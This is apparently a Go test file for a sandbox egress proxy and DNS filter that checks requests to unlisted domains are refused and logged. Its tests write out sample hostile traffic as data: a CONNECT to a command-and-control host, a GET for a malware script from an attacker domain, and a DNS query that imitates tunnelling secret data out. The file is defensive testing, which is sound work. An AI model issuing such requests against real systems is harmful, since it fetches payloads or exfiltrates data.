package proxy

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/bonjoski/airlock/pkg/audit"
)

func TestEgressProxy_DomainWhitelisting(t *testing.T) {
	p, err := New([]string{"custom-registry.internal"})
	if err != nil {
		t.Fatalf("Failed to create proxy: %v", err)
	}
	defer p.Close()

	if p.Port() <= 0 {
		t.Errorf("Expected valid port, got %d", p.Port())
	}
	if p.DNSPort() <= 0 {
		t.Errorf("Expected valid DNS port, got %d", p.DNSPort())
	}

	// 1. Test connecting to an UNAPPROVED domain -> Expect 403 Forbidden
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", p.Port()))
	if err != nil {
		t.Fatalf("Failed to dial proxy: %v", err)
	}
	defer conn.Close()

	req := "CONNECT c2.attacker.com:443 HTTP/1.1\r\nHost: c2.attacker.com:443\r\n\r\n"
	if _, err := conn.Write([]byte(req)); err != nil {
		t.Fatalf("Failed to write CONNECT request: %v", err)
	}

	reader := bufio.NewReader(conn)
	respLine, err := reader.ReadString('\n')
	if err != nil {
		t.Fatalf("Failed to read proxy response: %v", err)
	}

	if !strings.Contains(respLine, "403 Forbidden") {
		t.Errorf("Expected 403 Forbidden for unapproved domain, got: %s", respLine)
	}
}

func TestEgressProxy_PlainHTTPRejection(t *testing.T) {
	p, err := New([]string{})
	if err != nil {
		t.Fatalf("Failed to create proxy: %v", err)
	}
	defer p.Close()

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", p.Port()))
	if err != nil {
		t.Fatalf("Failed to dial proxy: %v", err)
	}
	defer conn.Close()

	req := "GET http://evil.attacker.com/malware.sh HTTP/1.1\r\nHost: evil.attacker.com\r\n\r\n"
	if _, err := conn.Write([]byte(req)); err != nil {
		t.Fatalf("Failed to write HTTP request: %v", err)
	}

	reader := bufio.NewReader(conn)
	respLine, err := reader.ReadString('\n')
	if err != nil {
		t.Fatalf("Failed to read proxy response: %v", err)
	}

	if !strings.Contains(respLine, "403 Forbidden") {
		t.Errorf("Expected 403 Forbidden for plain HTTP to unapproved domain, got: %s", respLine)
	}
}

func TestEgressProxy_AllowedDomainCheck(t *testing.T) {
	p, err := New([]string{"example.com"})
	if err != nil {
		t.Fatalf("Failed to create proxy: %v", err)
	}
	defer p.Close()

	// Direct allowed check
	if !p.isDomainAllowed("registry.npmjs.org") {
		t.Errorf("Expected registry.npmjs.org to be allowed")
	}
	if !p.isDomainAllowed("pypi.org") {
		t.Errorf("Expected pypi.org to be allowed")
	}
	if !p.isDomainAllowed("crates.io") {
		t.Errorf("Expected crates.io to be allowed")
	}
	if !p.isDomainAllowed("example.com") {
		t.Errorf("Expected custom domain example.com to be allowed")
	}
	if !p.isDomainAllowed("sub.example.com") {
		t.Errorf("Expected subdomain sub.example.com to be allowed")
	}

	// Disallowed check
	if p.isDomainAllowed("attacker.com") {
		t.Errorf("Expected attacker.com to be disallowed")
	}
	if p.isDomainAllowed("evilexample.com") {
		t.Errorf("Expected evilexample.com to be disallowed")
	}
}

func TestDNSServer_ResolutionAndTunnelingDenial(t *testing.T) {
	allowed := map[string]bool{
		"registry.npmjs.org": true,
		"pypi.org":           true,
	}

	var buf bytes.Buffer
	logger := audit.NewFileLogger(&buf)

	dnsServer, err := NewDNSServer(allowed, logger)
	if err != nil {
		t.Fatalf("Failed to create DNS server: %v", err)
	}
	defer dnsServer.Close()

	dnsAddr := fmt.Sprintf("127.0.0.1:%d", dnsServer.Port())

	// 1. Query an unauthorized domain (DNS Tunneling attempt) -> Expect NXDOMAIN (RCODE 3)
	nxDomainResp, err := queryRawDNS(dnsAddr, "secret-data.tunnel.attacker.com")
	if err != nil {
		t.Fatalf("DNS query failed: %v", err)
	}
	rcode := nxDomainResp.Flags & 0x000F
	if rcode != 3 {
		t.Errorf("Expected NXDOMAIN (rcode 3) for unauthorized domain, got rcode: %d", rcode)
	}

	// 2. Query an authorized domain -> Expect NoError (RCODE 0) and answers
	okResp, err := queryRawDNS(dnsAddr, "pypi.org")
	if err != nil {
		t.Fatalf("DNS query for pypi.org failed: %v", err)
	}
	okRcode := okResp.Flags & 0x000F
	if okRcode != 0 {
		t.Errorf("Expected NoError (rcode 0) for pypi.org, got rcode: %d", okRcode)
	}

	// Close the server so all handler goroutines have finished writing to the logger
	// before we read the buffer — prevents a data race under -race.
	dnsServer.Close()

	// Verify audit logs contain both DNS events
	logOutput := buf.String()
	if !strings.Contains(logOutput, "secret-data.tunnel.attacker.com") || !strings.Contains(logOutput, `"action":"DENY"`) {
		t.Errorf("Expected audit log to record denied DNS query: %s", logOutput)
	}
	if !strings.Contains(logOutput, "pypi.org") || !strings.Contains(logOutput, `"action":"ALLOW"`) {
		t.Errorf("Expected audit log to record allowed DNS query: %s", logOutput)
	}
}

func queryRawDNS(serverAddr string, domain string) (*DNSHeader, error) {
	conn, err := net.Dial("udp", serverAddr)
	if err != nil {
		return nil, fmt.Errorf("failed to dial dns server: %w", err)
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(2 * time.Second))

	// Assemble query packet
	var packet []byte
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], 0x1234) // ID
	binary.BigEndian.PutUint16(header[2:4], 0x0100) // Flags: RD=1
	binary.BigEndian.PutUint16(header[4:6], 1)      // QDCOUNT=1
	packet = append(packet, header...)

	// QNAME
	labels := strings.Split(domain, ".")
	for _, l := range labels {
		packet = append(packet, byte(len(l)))
		packet = append(packet, []byte(l)...)
	}
	packet = append(packet, 0x00) // terminate QNAME

	// QTYPE=1 (A), QCLASS=1 (IN)
	typeClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeClass[0:2], 1)
	binary.BigEndian.PutUint16(typeClass[2:4], 1)
	packet = append(packet, typeClass...)

	if _, err := conn.Write(packet); err != nil {
		return nil, fmt.Errorf("failed to send dns packet: %w", err)
	}

	resp := make([]byte, 512)
	n, err := conn.Read(resp)
	if err != nil {
		return nil, fmt.Errorf("failed to read dns response: %w", err)
	}

	if n < 12 {
		return nil, fmt.Errorf("response packet too short: %d bytes", n)
	}

	respHeader := &DNSHeader{
		ID:      binary.BigEndian.Uint16(resp[0:2]),
		Flags:   binary.BigEndian.Uint16(resp[2:4]),
		QDCount: binary.BigEndian.Uint16(resp[4:6]),
		ANCount: binary.BigEndian.Uint16(resp[6:8]),
		NSCount: binary.BigEndian.Uint16(resp[8:10]),
		ARCount: binary.BigEndian.Uint16(resp[10:12]),
	}

	return respHeader, nil
}
